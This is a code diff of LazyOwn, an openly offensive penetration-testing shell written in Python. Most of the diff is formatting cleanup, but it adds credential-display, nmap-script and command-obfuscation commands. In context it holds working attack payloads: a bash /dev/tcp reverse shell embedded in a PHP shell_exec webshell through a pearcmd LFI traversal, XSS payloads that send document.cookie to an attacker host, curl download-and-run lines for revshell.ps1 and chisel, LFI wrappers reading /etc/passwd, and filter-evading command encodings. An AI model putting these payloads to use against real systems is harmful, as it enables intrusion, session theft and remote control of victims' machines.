@@ -1,9 +1,9 @@
-#!/usr/bin/env python3 
-#_*_ coding: utf8 _*_
+#!/usr/bin/env python3
+# _*_ coding: utf8 _*_
 """
 lazyown
 
-Autor: Gris Iscomeback 
+Autor: Gris Iscomeback
 Correo electrónico: grisiscomeback[at]gmail[dot]com
 Fecha de creación: 09/06/2024
 Licencia: GPL v3
@@ -22,8 +22,8 @@ Descripción: Este archivo contiene la definición de la lógica en la clase Laz
 from cmd import Cmd
 from utils import *
 
+
 class LazyOwnShell(Cmd):
-    
     prompt = getprompt()
 
     if NOBANNER:
@@ -216,10 +216,10 @@ class LazyOwnShell(Cmd):
         """
         Set a parameter value.
 
-        This function takes a line of input, splits it into a parameter and a value, 
+        This function takes a line of input, splits it into a parameter and a value,
         and sets the specified parameter to the given value if the parameter exists.
 
-        :param line: A string containing the parameter and value to be set. 
+        :param line: A string containing the parameter and value to be set.
                     Expected format: '<parameter> <value>'.
         :type line: str
         :return: None
@@ -725,7 +725,7 @@ class LazyOwnShell(Cmd):
 
         lhost = self.params["lhost"]
         lport = self.params["lport"]
-        
+
         if not lhost or not lport:
             print_error("lport and lhost must be set")
             return
@@ -776,7 +776,9 @@ class LazyOwnShell(Cmd):
             # Move and set permissions for the generated payload
             if choice in commands:
                 os.system("mkdir -p sessions")
-                os.system("mv shell* sessions 2>/dev/null")  # Move files and suppress errors if no files match
+                os.system(
+                    "mv shell* sessions 2>/dev/null"
+                )  # Move files and suppress errors if no files match
                 os.system("chmod +x sessions/shell*")
 
             print_msg("Payloads moved to sessions/")
@@ -801,12 +803,15 @@ class LazyOwnShell(Cmd):
                 # Handle the payload in C (shikata_ga_nai)
                 if os.path.exists("payload.c"):
                     print_msg("Payload in C generated: payload.c")
-                    os.system(f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip")
-                    print_msg(f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard")
+                    os.system(
+                        f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
+                    )
+                    print_msg(
+                        f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard"
+                    )
 
         else:
             print_error("Invalid choice. Please select a number between 1 and 13.")
-
 
     def run_lazyaslrcheck(self):
         """
@@ -852,17 +857,17 @@ class LazyOwnShell(Cmd):
         if not binary_name:
             print_msg("binary_name must be set")
             return
-        
+
         os.system(f"echo {binary_name} >> modules/tmp.sh")
         os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
         os.system(f"chmod +x /tmp/{binary_name}")
         os.system("export PATH=/tmp:$PATH")
-        
+
         print_msg(f"echo {binary_name} >> modules/tmp.sh")
         print_msg(f"cp modules/tmp.sh /tmp/{binary_name}")
         print_msg(f"chmod +x /tmp/{binary_name}")
         print_msg("export PATH=/tmp:$PATH")
-        
+
         print_msg(
             f"Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
         )
@@ -981,7 +986,7 @@ class LazyOwnShell(Cmd):
         return
 
     def do_smbmap(self, line):
-        """smbmap -H 10.10.10.3 [OPTIONS] 
+        """smbmap -H 10.10.10.3 [OPTIONS]
         Uses the `smbmap` tool to interact with SMB shares on a remote host:
 
         1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
@@ -1446,9 +1451,11 @@ class LazyOwnShell(Cmd):
             if line.startswith("sub"):
                 params = line.split(" ")
                 count = len(params)
-                dnswordlist = self.params['dnswordlist']
+                dnswordlist = self.params["dnswordlist"]
                 if not dnswordlist:
-                    print_error("use payload or p to load the parameter from payload.json, or just set dnswordlist path/to/dnswordlist")
+                    print_error(
+                        "use payload or p to load the parameter from payload.json, or just set dnswordlist path/to/dnswordlist"
+                    )
                     return
 
                 if count == 1:
@@ -1476,7 +1483,7 @@ class LazyOwnShell(Cmd):
                 print_msg(params)
                 count = len(params)
                 arg1 = params[0]
-                iiswordlist = "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt" # dont know why this line dont work ... self.params['iiswordlist']
+                iiswordlist = "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt"  # dont know why this line dont work ... self.params['iiswordlist']
 
                 if not os.path.exists(iiswordlist):
                     print_error(
@@ -1531,20 +1538,20 @@ class LazyOwnShell(Cmd):
             - Ensure that `curl` is installed and accessible in your environment.
             - The extracted codenames are printed to the console.
         """
-       
+
         parts = line.split()
         if len(parts) > 1:
-            distribution = parts[1].lower()  
+            distribution = parts[1].lower()
         else:
-            distribution = 'ubuntu'  
+            distribution = "ubuntu"
 
-        
         encoded_line = quote(line.strip())
-        
-        
-        command = f'curl -s "https://launchpad.net/+search?field.text={encoded_line}" | grep \'href\' | grep \'{distribution}\' | grep -oP \'(?<=href="https://launchpad.net/{distribution}/)[^/"]+\' | sort -u'
-        
-        print_msg("Searches for packages on Launchpad based on the provided search, no warranties. ssh package give the best results")
+
+        command = f"curl -s \"https://launchpad.net/+search?field.text={encoded_line}\" | grep 'href' | grep '{distribution}' | grep -oP '(?<=href=\"https://launchpad.net/{distribution}/)[^/\"]+' | sort -u"
+
+        print_msg(
+            "Searches for packages on Launchpad based on the provided search, no warranties. ssh package give the best results"
+        )
         os.system(command)
 
     def do_gobuster(self, line):
@@ -1598,9 +1605,13 @@ class LazyOwnShell(Cmd):
             if not url:
                 print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
                 return
-            print_msg(f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}")
-            os.system(f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600")
-            return            
+            print_msg(
+                f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}"
+            )
+            os.system(
+                f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600"
+            )
+            return
         print_msg(
             f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} {RESET}"
         )
@@ -2034,8 +2045,12 @@ class LazyOwnShell(Cmd):
         print_msg(
             f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} "
         )
-        os.system(f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1' | xclip -sel clip")
-        print_msg(f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\revshell.ps1' | xclip -sel clip")
+        os.system(
+            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1' | xclip -sel clip"
+        )
+        print_msg(
+            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\revshell.ps1' | xclip -sel clip"
+        )
         return
 
     def do_createhash(self, line):
@@ -2068,10 +2083,10 @@ class LazyOwnShell(Cmd):
         print_msg(
             f"Creando archivo sessions/cookie.txt con el siguiente contenido {line}{RESET}"
         )
-        
+
         # Usa una expresión regular para encontrar la parte que te interesa
-        match = re.search(r'cookie=([^&]+)', line)
-        
+        match = re.search(r"cookie=([^&]+)", line)
+
         if match:
             # Extrae el valor después de 'cookie='
             cookie_value = match.group(1)
@@ -2104,7 +2119,9 @@ class LazyOwnShell(Cmd):
         )
         print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
         os.system("cd external/.exploit && python3 -m http.server 8443")
-        print_msg(f"Shutdown Web server at external/.exploit in port {RED} 8443 {RESET}")
+        print_msg(
+            f"Shutdown Web server at external/.exploit in port {RED} 8443 {RESET}"
+        )
         return
 
         return
@@ -2160,10 +2177,12 @@ class LazyOwnShell(Cmd):
         parts = line.split()
 
         if len(parts) == 1:
-            return [str(x) for x in range(0, 20000) if str(x).startswith(text)]  # Modify the range as needed for mode options
-        
+            return [
+                str(x) for x in range(0, 20000) if str(x).startswith(text)
+            ]  # Modify the range as needed for mode options
+
         if len(parts) == 2:
-            return [f for f in glob.glob('sessions/hash.txt') if f.startswith(text)]
+            return [f for f in glob.glob("sessions/hash.txt") if f.startswith(text)]
 
         return []
 
@@ -2225,16 +2244,20 @@ class LazyOwnShell(Cmd):
         if not lhost or not lport or not rhost:
             print_error(f"rhost, lhost and lport must be set.{RESET}")
             return
-        
-        print_msg(f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' {MAGENTA}copied to cplipboard :D ")
+
+        print_msg(
+            f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' {MAGENTA}copied to cplipboard :D "
+        )
         print_warn("<modo de uso>")
-        print(f'http://{rhost}/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/ ')
+        print(
+            f"http://{rhost}/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/ "
+        )
         print('<?shell_exec(base64_decode("')
         os.system(
             f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" | base64"
         )
         print('"));?>')
-        print('+/tmp/shell.php')
+        print("+/tmp/shell.php")
         print_warn("</modo de uso>")
         os.system(
             f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip"
@@ -2254,8 +2277,8 @@ class LazyOwnShell(Cmd):
         print_msg(f"Crafting img payload...")
 
         # Payload 1
-        command1 = f"echo \"<script>new Image().src=\"http://{lhost}:80/cookie?c=\"+document.cookie;</script>\" | xclip -sel clip"
-        
+        command1 = f'echo "<script>new Image().src="http://{lhost}:80/cookie?c="+document.cookie;</script>" | xclip -sel clip'
+
         # Payload 2
         cmd = f"""fetch('http://{lhost}:80/?cookie='+document.cookie)"""
         utf8_encoded = cmd.encode("utf-8")
@@ -2269,7 +2292,9 @@ class LazyOwnShell(Cmd):
         print_msg(f"Payload 2: {command2}")
         print_warn("</modo_de_uso>")
 
-        choice = input(f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}").strip()
+        choice = input(
+            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
+        ).strip()
 
         if choice == "1":
             os.system(command1)
@@ -2516,14 +2541,14 @@ class LazyOwnShell(Cmd):
         """Open VPN like HTB VPN command vpn now handle multiple ovpn files"""
 
         # List all .ovpn files
-        ovpn_files = sorted([f for f in os.listdir('.') if f.endswith('.ovpn')])
+        ovpn_files = sorted([f for f in os.listdir(".") if f.endswith(".ovpn")])
 
         # Handle no arguments
         if not line.strip():
             if not ovpn_files:
                 print_msg("No .ovpn files found.")
                 return
-            
+
             print_msg("Available .ovpn files:")
             for idx, file in enumerate(ovpn_files, start=1):
                 print_msg(f"{idx}: {file}")
@@ -2549,11 +2574,15 @@ class LazyOwnShell(Cmd):
                         os.system(f"sudo openvpn {ovpn_files[choice - 1]}")
                         print_msg(f"Connecting to {ovpn_files[choice - 1]}")
                     else:
-                        print_error("Invalid number. Please select a number from the list.")
+                        print_error(
+                            "Invalid number. Please select a number from the list."
+                        )
                 except ValueError:
                     print_error("Invalid input. Please enter a number.")
             else:
-                print_error("Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly.")
+                print_error(
+                    "Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly."
+                )
         return
 
     def do_id_rsa(self, line):
@@ -2567,7 +2596,9 @@ class LazyOwnShell(Cmd):
         file = f"sessions/id_rsa_{line}"
         print_msg(f"Try... nano {file}")
         os.system(f"nano {file} && chmod 400 {file}")
-        print_msg(f"{YELLOW} Conecting to ssh {line}@{rhost} -i {file} {RED}[;,;] {RESET}")
+        print_msg(
+            f"{YELLOW} Conecting to ssh {line}@{rhost} -i {file} {RED}[;,;] {RESET}"
+        )
         os.system(f"ssh {line}@{rhost} -i {file}")
         print_warn("ssh conection closed")
         return
@@ -2590,17 +2621,19 @@ class LazyOwnShell(Cmd):
 
     def do_wrapper(self, line):
         """copy to clipboard some wrapper to lfi"""
-        
+
         command1 = "echo ' php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip"
         command2 = "echo ' file:///proc/self/cmdline' | xclip -sel clip"
         command3 = "echo ' file:///etc/passwd' | xclip -sel clip"
-        
+
         print_warn("<modo de uso>")
         print_msg(f"{command1=}")
         print_msg(f"{command2=}")
         print_msg(f"{command3=}")
         print_warn("</modo de uso>")
-        choice = input(f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}").strip()
+        choice = input(
+            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}"
+        ).strip()
 
         if choice == "1":
             os.system(command1)
@@ -2612,7 +2645,7 @@ class LazyOwnShell(Cmd):
             os.system(command3)
             print_msg(f"Payload 3 copied to Clipboard")
         else:
-            print_error("Invalid choice. Please select 1, 2 or 3.")        
+            print_error("Invalid choice. Please select 1, 2 or 3.")
         return
 
     def do_samrdump(self, line):
@@ -2632,7 +2665,7 @@ class LazyOwnShell(Cmd):
         if not line.strip():
             print_error("Please provide a string to encode.")
             return
-        
+
         encoded_string = quote(line.strip())
         print_msg(encoded_string)
         return
@@ -2642,7 +2675,7 @@ class LazyOwnShell(Cmd):
         if not line.strip():
             print_error("Please provide a string to decode.")
             return
-        
+
         decoded_string = unquote(line.strip())
         print_msg(decoded_string)
         return
@@ -2671,7 +2704,7 @@ class LazyOwnShell(Cmd):
 
     def do_encode(self, line):
         """Encodes a string with the given shift value and substitution key"""
-        parts = line.split(' ', 2)
+        parts = line.split(" ", 2)
         if len(parts) != 3:
             print_error("Usage: encode <shift_value> <substitution_key> <string>")
             return
@@ -2691,7 +2724,7 @@ class LazyOwnShell(Cmd):
 
     def do_decode(self, line):
         """Decodes a string with the given shift value and substitution key"""
-        parts = line.split(' ', 2)
+        parts = line.split(" ", 2)
         if len(parts) != 3:
             print_error("Usage: decode <shift_value> <substitution_key> <string>")
             return
@@ -2708,6 +2741,59 @@ class LazyOwnShell(Cmd):
         decoded_string = decode(input_string, shift_value, substitution_key)
         print_msg(f"Decoded string: {decoded_string}")
         return
+    def do_creds(self, line):
+        """
+        Display the credentials stored in the `credentials.txt` file and copy the password to the clipboard.
+
+        This function reads the stored credentials from a file named `credentials.txt` located in the `sessions` directory.
+        The file should be in the format `username:password`. If the file does not exist, an error message will be printed
+        instructing the user to create the credentials file first. The function extracts the username and password from the file,
+        prints them, and copies the password to the clipboard using `xclip`.
+
+        :param line: A string parameter that is not used in this function. It is included for compatibility with command-line
+                    interface functions.
+
+        :returns: None
+
+        Manual execution:
+        To manually perform the equivalent actions, follow these steps:
+
+            1. Ensure the file `sessions/credentials.txt` exists and contains credentials in the format `username:password`.
+            2. Read the file and extract the username and password.
+            3. Print the username and password to the console.
+            4. Use the `xclip` tool to copy the password to the clipboard. Example command:
+
+                echo '<password>' | xclip -sel clip
+
+        Example:
+        If `sessions/credentials.txt` contains `admin:password123`, the function will print:
+
+            User : admin
+            Pass : password123
+
+        The password `password123` will be copied to the clipboard.
+
+        Note:
+        Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
+        and correctly configured.
+        """
+        path = os.getcwd()    
+        file = f"{path}/sessions/credentials.txt"
+        if not os.path.exists(file):
+            print_error("You need use createcredentials user:pass before.")
+            return
+        
+        with open(file, "rb") as f:
+            data = f.read()
+        creds = data.split(b":")
+        user = creds[0].decode('utf-8')
+        passwd = creds[1].decode('utf-8').replace('\n','')
+        print_msg(f"User : {user}")
+        print_msg(f"Pass : {passwd}")
+        command = f"echo '{passwd}' | xclip -sel clip"
+        os.system(command)
+        print_msg(command)
+        return
 
     def do_rot(self, line):
         """
@@ -2716,7 +2802,6 @@ class LazyOwnShell(Cmd):
         Usage:
             rot <number> '<string>'
         """
-        
 
         # Split the line into parts
         parts = line.split("'", 1)
@@ -2738,7 +2823,7 @@ class LazyOwnShell(Cmd):
             return
 
         # Apply the rotation
-        rotated_text = ''.join(rotate_char(c, number) for c in text)
+        rotated_text = "".join(rotate_char(c, number) for c in text)
         print_msg(rotated_text)
         return
 
@@ -2747,26 +2832,108 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         wordlist = self.params["wordlist"]
         if not wordlist:
-            print_error("you need load the payload using p or payload or set wordlist /oath/to/wordlist")
+            print_error(
+                "you need load the payload using p or payload or set wordlist /oath/to/wordlist"
+            )
             return
         if not check_rhost(rhost):
             return
         if not line:
-            print_error("you need pass the path to crack and the port example hydra /login/ 8080")
+            print_error(
+                "you need pass the path to crack and the port example hydra /login/ 8080"
+            )
             return
         args = line.split(" ")
-        
+
         if len(args) < 2:
-            print_error("you need pass the path to crack and the port example hydra /login/ 8080")
+            print_error(
+                "you need pass the path to crack and the port example hydra /login/ 8080"
+            )
             return
-        print_msg(f"Try... hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}")
-        os.system(f"hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}")
+        print_msg(
+            f"Try... hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}"
+        )
+        os.system(
+            f"hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}"
+        )
         return
+
+    def do_nmapscript(self, line):
+        """Perform an Nmap scan using a specified script and port.
+
+        :param line: A string containing the Nmap script and port, separated by a space. Example: "http-enum 80".
+
+        :returns: None
+
+        Manual execution:
+        To manually run an Nmap scan with a script and port, use the following command format:
+
+            nmap --script <script> -p <port> <target> -oN <output-file>
+
+        Example:
+        If you want to use the script `http-enum` on port `80` for the target `10.10.10.10`, you would run:
+
+            nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10
+
+        Ensure you have the target host (`rhost`) set in the parameters and provide the script and port as arguments. The results will be saved in the file `sessions/webScan_<rhost>`.
+        """
+
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+        parts = line.split(" ", 2)
+        print(len(parts))
+        if len(parts) != 2:
+            print_error("Usage: nmapscript <script> <port>")
+            return
+        script = parts[0]    
+        port = parts[1]
+        print_msg(
+            f"Try... nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}"
+        )
+        os.system(f"nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
+        return
+
+    def do_encoderpayload(self, line):
+        try:
+            # Base64 double encoding
+            def double_base64_encode(cmd):
+                return base64.b64encode(base64.b64encode(cmd.encode()).strip()).decode().strip()
+            
+            def apply_obfuscations(cmd):
+                obfuscations = [
+                    f"echo \"echo $(echo '{cmd}' | base64 | base64)|base64 -d|base64 -d|bash\" | sed 's/ /${{IFS}}/g'",
+                    f"echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash",
+                    f"$(tr '[A-Z]' '[a-z]' <<< '{cmd}')",
+                    f"$(a='{cmd}'; printf %s \"${{a,,}}\")",
+                    f"$(rev <<< '{cmd}')",
+                    f"bash <<< $(base64 -d <<< {base64.b64encode(cmd.encode()).decode()})",
+                    f"echo {cmd} | $0",
+                    f"cat$u /etc$u/passwd$u",
+                    f"p${{u}}i${{u}}n${{u}}g",
+                    f"p\\\i\\\n\\\g",
+                    f"cat ${{HOME:0:1}}etc${{HOME:0:1}}passwd",
+                    f"cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
+                    f"echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
+                    f"cat $(echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
+                    f"abc=${'$'}'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'; cat abc",
+                    f"$(printf %.1s \"$PWD\")bin$(printf %.1s \"$PWD\")ls",
+                    f"while read -r line; do echo $line; done < /etc/passwd"
+                ]
+                return obfuscations
+
+            # Apply obfuscations
+            obfuscations = apply_obfuscations(line)
+            for obfuscation in obfuscations:
+                print_msg(obfuscation)
+        
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
 
     def do_smtpuserenum(self, line):
         """sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10"""
         rhost = self.params["rhost"]
-        usrwordlist = self.params['usrwordlist']
+        usrwordlist = self.params["usrwordlist"]
         if not check_rhost(rhost):
             return
         if not usrwordlist:
@@ -2801,7 +2968,7 @@ class LazyOwnShell(Cmd):
         Search for commands matching the given parameter in the cmd interface and optionally extend the search using the system's `apropos` command.
 
         :param line: The search term to find matching commands.
-        
+
         :returns: None
 
         Manual execution:
@@ -2813,7 +2980,7 @@ class LazyOwnShell(Cmd):
             apropos network
 
         The `apropos` command will search for commands and documentation that match the given search term.
-        
+
         The function also searches within the available commands in the cmd interface.
         """
         # Search within the cmd commands
@@ -2827,9 +2994,11 @@ class LazyOwnShell(Cmd):
             print_warn("No matching commands found in the cmd interface.")
 
         # Ask if the user wants to extend the search using the system's apropos command
-        extend_search = input(f"    {YELLOW}[?] {WHITE}Do you want to extend the search using the system's {GREEN}`apropos`{WHITE} command? {MAGENTA}(y/n): {RESET}")
-        
-        if extend_search.lower() == 'y':
+        extend_search = input(
+            f"    {YELLOW}[?] {WHITE}Do you want to extend the search using the system's {GREEN}`apropos`{WHITE} command? {MAGENTA}(y/n): {RESET}"
+        )
+
+        if extend_search.lower() == "y":
             print_msg(f"Searching for '{line}' using `apropos`...")
             os.system(f"apropos {line}")
         return
@@ -2842,18 +3011,16 @@ class LazyOwnShell(Cmd):
 
         print_msg(f"Try... hashcat -h | grep -i {line}{RESET}")
         os.system(f"hashcat -h | grep -i {line}")
-        print_msg(
-            f"now you can run : {MAGENTA} hashcat NNN sessions/hash.txt {RESET}"
-        )
+        print_msg(f"now you can run : {MAGENTA} hashcat NNN sessions/hash.txt {RESET}")
         return
 
     def do_clean(self, line):
         """delete all from sessions"""
         rhost = self.params["rhost"]
         if not check_rhost(rhost):
-            return        
+            return
         os.system(
-            f"rm sessions/cookie.txt sessions/{rhost} sessions/aav.vbs sessions/*.html external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf"
+            f"rm sessions/cookie.txt sessions/{rhost} sessions/*{rhost}* sessions/aav.vbs sessions/*.html external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf"
         )
         print_msg(f"Cleanned sessions & external directory. {RESET}")
         return
@@ -3007,7 +3174,9 @@ class LazyOwnShell(Cmd):
                 f"You must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
             )
             return
-        if not os.path.exists("sessions/chisel_1.9.1_linux_amd64.gz") or not os.path.exists('./sessions/chisel_1.9.1_windows_amd64.gz'):
+        if not os.path.exists(
+            "sessions/chisel_1.9.1_linux_amd64.gz"
+        ) or not os.path.exists("./sessions/chisel_1.9.1_windows_amd64.gz"):
             print_error(
                 f"You must run the command {GREEN}download_resources{YELLOW} before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}"
             )
@@ -3024,18 +3193,20 @@ class LazyOwnShell(Cmd):
             command += " .\\"
             command += f"""pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
             command1 = f"echo '{command}' | xclip -sel clip"
-            
+
             command = f"""curl http://{lhost}/chisel_1.9.1_linux_amd64 -o chisel ; chmod +x chisel ; """
             command += " ./"
-            command += f"""chisel client -v {lhost}:{lport} R:127.0.0.1:socks"""            
+            command += f"""chisel client -v {lhost}:{lport} R:127.0.0.1:socks"""
             command2 = f"echo '{command}' | xclip -sel clip"
-            
+
             print_warn("<modo de uso>")
             print_msg(f"{command1=}")
             print_msg(f"{command2=}")
             print_warn("</modo de uso>")
 
-            choice = input(f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}").strip()
+            choice = input(
+                f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
+            ).strip()
 
             if choice == "1":
                 os.system(command1)
@@ -3045,8 +3216,8 @@ class LazyOwnShell(Cmd):
                 print_msg(f"Payload 2 copied to Clipboard")
 
             else:
-                print_error("Invalid choice. Please select 1 or 2")        
-                return            
+                print_error("Invalid choice. Please select 1 or 2")
+                return
 
             os.system(
                 f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && upx chisel.exe && upx chisel_1.9.1_linux_amd64 && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v"
@@ -3418,7 +3589,6 @@ def xor_encrypt_decrypt(data, key):
 
 
 if __name__ == "__main__":
-    
     p = LazyOwnShell()
 
     if arguments:
